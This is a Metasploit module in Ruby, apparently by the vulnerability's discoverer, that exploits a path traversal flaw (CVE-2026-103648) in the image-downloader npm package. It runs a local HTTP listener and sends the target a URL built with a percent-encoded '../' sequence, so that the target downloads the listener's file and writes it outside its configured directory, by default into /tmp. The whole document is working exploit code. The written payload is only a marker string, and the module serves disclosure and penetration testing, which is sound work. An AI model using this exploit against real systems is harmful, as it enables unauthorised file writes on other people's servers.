# frozen_string_literal: true

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'image-downloader npm Package Path Traversal (Arbitrary File Write)',
        'Description' => %q{
          This module exploits a path traversal vulnerability (CVE-2026-103648) in the
          image-downloader npm package prior to version 4.3.1. Any application that calls
          download.image({ url, dest }) with a URL it does not fully control (user-submitted
          image imports, webhook payloads, content feed entries) is vulnerable.

          The library's filename-extraction logic calls path.basename() on the still
          percent-encoded URL pathname before decodeURIComponent() runs on it. A sequence
          such as %2e%2e%2f contains no literal '/' at extraction time, so it survives
          basename() unchanged; decodeURIComponent() is only applied afterward, turning it
          into a literal '../', which path.join() then normalizes to a path outside the
          configured destination directory.

          This module starts a local HTTP listener and sends the target a URL, built with
          a percent-encoded traversal sequence, that points back at that listener. If the
          target is vulnerable, it will fetch the listener's payload and write it outside
          its configured download directory. The module confirms exploitation by observing
          the target's outbound fetch; it cannot read the target's filesystem remotely, so
          verifying that the written file actually landed outside the destination directory
          requires local access to the target (see the Docker lab in the referenced
          repository for an end-to-end reproduction).
        },
        'Author' => [
          'Amirhossein Roustaei (EterNullSec)' # Discovery and Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2026-103648'],
          ['URL', 'https://github.com/EterNullSec/CVE-2026-103648'],
          ['URL', 'https://gitlab.com/demsking/image-downloader/-/commit/fb4454304276e2439fb19b98836b3ba903b3aaea']
        ],
        'DisclosureDate' => '2026-10-02',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        Opt::RPORT(3000),
        OptString.new('TARGETURI', [true, 'Path to the endpoint that triggers download.image()', '/download']),
        OptString.new('URLPARAM', [true, 'Query param the endpoint reads the attacker URL from', 'url']),
        OptInt.new('DEPTH', [true, 'Number of ../ traversal levels to encode', 2]),
        OptString.new('FILENAME', [true, 'Filename written after the traversal sequence', 'pwned_by_msf.txt']),
        OptInt.new('CALLBACK_TIMEOUT', [true, 'Seconds to wait for the target to fetch the payload', 15])
      ]
    )
  end

  def run
    @callback_received = false
    payload_content = "CVE-2026-103648 | image-downloader path traversal | #{Rex::Text.rand_text_alpha(8)}\n"

    start_service(
      'Uri' => {
        'Proc' => proc do |cli, req|
          on_payload_request(cli, req, payload_content)
        end,
        'Path' => '/'
      }
    )
    print_status("Started payload listener on #{srvhost_addr}:#{srvport}")

    callback_url = build_callback_url
    print_status("Callback URL: #{callback_url}")

    traversal_path = build_traversal_path
    print_status("Triggering #{normalize_uri(target_uri.path)} with traversal payload: #{traversal_path}")

    send_trigger(callback_url)
    wait_for_callback(datastore['CALLBACK_TIMEOUT'])

    if @callback_received
      print_good('Target fetched the payload. CVE-2026-103648 is likely exploitable.')
      print_warning('Remote filesystem access is required to confirm the file landed outside dest.')

      report_vuln(
        host: rhost,
        port: rport,
        proto: 'tcp',
        name: name,
        info: "Target fetched the listener after a traversal-encoded URL was sent (#{traversal_path})",
        refs: references
      )
    else
      print_error('No callback received. Target may not be vulnerable, may not reach ' \
                   "#{srvhost_addr}:#{srvport}, or TARGETURI/URLPARAM may be wrong.")
    end
  end

  def build_traversal_path
    traversal = (['%2e%2e'] * datastore['DEPTH']).join('%2f')
    "/#{traversal}%2ftmp%2f#{datastore['FILENAME']}"
  end

  def build_callback_url
    "http://#{srvhost_addr}:#{srvport}#{build_traversal_path}"
  end

  def send_trigger(callback_url)
    send_request_cgi(
      'uri' => normalize_uri(target_uri.path),
      'method' => 'GET',
      'vars_get' => {
        datastore['URLPARAM'] => callback_url
      }
    )
  end

  def wait_for_callback(timeout)
    deadline = Time.now + timeout
    sleep(0.5) until @callback_received || Time.now > deadline
  end

  def on_payload_request(cli, req, payload_content)
    print_status("Payload fetched by #{cli.peerhost} - #{req.method} #{req.uri}")
    @callback_received = true
    send_response(cli, payload_content, { 'Content-Type' => 'text/plain' })
  end
end
